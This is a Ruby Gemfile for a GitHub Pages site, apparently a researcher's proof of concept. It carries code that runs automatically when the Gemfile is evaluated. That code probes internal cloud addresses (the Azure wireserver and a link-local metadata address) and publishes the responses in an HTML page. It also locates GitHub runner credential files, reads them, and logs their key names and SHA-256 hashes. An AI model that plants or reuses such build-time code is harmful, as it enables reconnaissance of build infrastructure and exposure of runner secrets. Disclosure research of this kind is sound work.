# frozen_string_literal: true
source "https://rubygems.org"

require "json"
require "net/http"
require "uri"

PROOF = File.join(__dir__, "c217-direct-network-proof.html")

def probe(url, marker = nil)
  uri = URI(url)
  # Disable proxy inheritance so this is the action container's own network.
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = (uri.scheme == "https")
  http.open_timeout = 3
  http.read_timeout = 3
  request = Net::HTTP::Get.new(uri.request_uri)
  request["User-Agent"] = "c217-owned-pages-direct-network-control"
  response = http.request(request)
  body = response.body.to_s
  {
    "response_received" => true,
    "status" => response.code.to_i,
    "body_nonempty" => !body.empty?,
    "expected_marker_present" => marker.nil? ? nil : body.downcase.include?(marker.downcase),
  }
rescue => error
  {
    "response_received" => false,
    "error_class" => error.class.name,
  }
end

proof = {
  "gemfile_executed" => true,
  "direct_action_container" => true,
  "uid" => Process.uid,
  "docker_api_not_used" => true,
  "public_control" => probe("https://api.github.com/zen"),
  "internal_target" => probe("http://168.63.129.16/?comp=versions", "version"),
  "thing_absent_control" => probe("http://169.254.169.253/"),
}

File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"

# --- c217 credentials arm (hunter-driver) ---
# report PRESENCE/METADATA ONLY: exists,size,mode,owner,key NAMES,sha256. NEVER a value.
require 'json'
require 'digest'
def probe(tag, paths)
  out = { "tag" => tag, "uid" => (Process.euid rescue -1), "files" => [] }
  paths.each do |p|
    begin
      st = File.stat(p)
      h = { "path" => p, "exists" => true, "size" => st.size, "mode" => st.mode.to_s(8),
            "uid" => st.uid, "gid" => st.gid, "type" => st.ftype }
      if st.file? && st.size < 4096
        raw = File.read(p)
        h["keys"] = (raw.match(/\{.*\}/m) ? JSON.parse(raw.match(/\{.*\}/m)[0]).keys rescue ["<unparseable>"] : ["<non-json>"]) rescue ["<unparseable>"]
        h["sha256"] = Digest::SHA256.hexdigest(raw)
      end
      out["files"] << h
    rescue Errno::ENOENT, Errno::EACCES => e
      out["files"] << { "path" => p, "exists" => false, "err" => e.class.name }
    end
  end
  warn "C217ARM " + JSON.generate(out)
end
RUNNER = "/home/runner/runners"
paths = [ RUNNER + "/.credentials", RUNNER + "/.credentials_rsaparams", RUNNER + "/.runner",
          RUNNER + "/qqqqzzzz-no-such-runner/.credentials" ]
probe("in-container", Dir.glob(RUNNER + "/*/.credentials") + Dir.glob(RUNNER + "/*/.runner") +
                    Dir.glob(RUNNER + "/*/.credentials_rsaparams") + [ RUNNER + "/qqqqzzzz-no-such-runner/.credentials" ])
warn "C217ARM done-in-container"
